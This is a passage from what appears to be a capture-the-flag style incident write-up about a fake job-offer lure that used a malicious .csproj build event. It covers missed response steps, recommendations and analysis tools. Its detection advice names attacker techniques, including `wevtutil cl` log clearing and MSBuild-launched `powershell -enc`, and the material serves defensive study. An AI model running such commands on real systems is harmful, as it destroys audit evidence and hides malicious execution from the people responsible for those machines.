| Impact | T1486, Data Encrypted for Impact | AES-256 encryption of a Documents file; original deleted |

---

## 7. What Randall Overlooked

Randall killed the alert, but the investigation shows why that was not enough:

1. **Defender only stopped the binary.** Quarantine removed `Ms1.exe`, but `stager.js`, the poisoned project, the original email and the ZIP all remained on disk, with the malicious `.csproj` ready to fire again on any future build.
2. **The payload had already (or could have) acted.** `Ms1.exe` sleeps for only 3.5 seconds before creating the `support_tech` administrator. Quarantine two minutes later does not prove those commands never ran. The UAC prompt raised by the `runas` verb is also something a distracted user may click through. **Any trust in this host requires checking `net user` / `net localgroup Administrators`.**
3. **A file was encrypted and its original deleted.** The Q4 internal report was TOP-SECRET-classified client data. The loss of the plaintext, and whether it was copied before encryption, needs to be assessed.
4. **The logs were wiped.** The Setup, System, Security and Application logs were cleared, so the standard trail (4720/4732 account events, 4688 process creation, PowerShell logs) is gone from the host. Evidence must come from elsewhere (EDR, network, mail gateway).
5. **The email and infrastructure were not reported.** The campaign targeted a *security professional* and reuses a template across candidates ("we reuse the same exercise for other candidates"), so other people are probably exposed.

---

## 8. Recommendations

**Immediate response**

- Isolate the host; treat it as compromised until rebuilt from known-good media.
- Enumerate and remove `support_tech`; rotate **all** credentials used on this machine (the account password is known to the attacker).
- Block `brightlinesec-careers.thm` at DNS/proxy/email and hunt for it, `stager.js` and `Ms1.exe` fleet-wide.
- Decrypt and restore the report with the recovered key and IV; assess whether the data was exfiltrated.
- Report the lure to the real Brightline Security Partners (if the company exists) and to relevant takedown/abuse channels.

**Preventive controls**

- **Never build untrusted .NET/Visual Studio projects on a workstation that has real data.** Open them in a disposable VM, or at minimum read the `.csproj`, `.sln` and any `*.targets` files first. Pre-build and post-build events are code execution.
- Keep Visual Studio's *Restricted Mode*/trusted-location protections on; block MSBuild-launched `powershell -enc` with EDR.
- Constrain `wscript.exe` / `cscript.exe` and `powershell -enc` with ASR rules and application control.
- Alert on `wevtutil cl` and on new local administrators (Event IDs 1102, 104, 4720, 4732).
- Forward logs off-box in near real time so local log clearing cannot erase the trail.
- Train staff that a hiring process never needs "build this once so we can register you".

---

## 9. Tools and Artefacts Used

| Tool | Purpose |
|---|---|
| FTK Imager 8.3.0.27 | Mounting `capture.E01` read-only as `D:` |
| Notepad / Neovim | Reading `.eml`, `.csproj`, `stager.js`, editing the script |
| CyberChef | Base64/UTF-16LE decoding, AES-CBC decryption, hex decoding |
| `defender-dump` (modified) | Extracting `Ms1.exe` from Defender's quarantine |
| `sha256sum` | Hashing the payload |
| dnSpy 6.1.8 | Static decompilation of the obfuscated .NET payload |
| OpenSSL | Independent verification of the decryption |
| WSL (Kali) | Analysis workstation, helper scripts (`new_host`, `edit_host`, `winpath`) |

**Reproducibility:** all CyberChef recipes (`base64.decode.cyberchef.link`, `encryption.decode.cyberchef.link`, `flag.hex.decode.cyberchef.link`) and the decompiled source (`ms1.dnspy.reverse.content`) were saved to the `decryption/` folder of my working directory.